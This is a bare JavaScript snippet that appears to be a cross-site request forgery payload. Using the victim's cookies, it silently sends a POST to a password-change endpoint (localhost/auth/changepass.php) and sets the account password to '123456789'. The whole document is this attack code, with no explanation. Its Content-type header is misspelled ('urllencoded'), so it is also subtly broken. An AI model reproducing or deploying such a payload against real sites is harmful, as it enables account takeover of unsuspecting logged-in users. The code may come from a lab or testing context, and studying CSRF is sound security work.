var request = new XMLHttpRequest();
var data = 'password=123456789&password_2=123456789&do_change=1';
request.open('POST', 'http://localhost/auth/changepass.php', true);
request.withCredentials = true;
request.setRequestHeader("Content-type", "application/x-www-form-urllencoded");
request.send(data);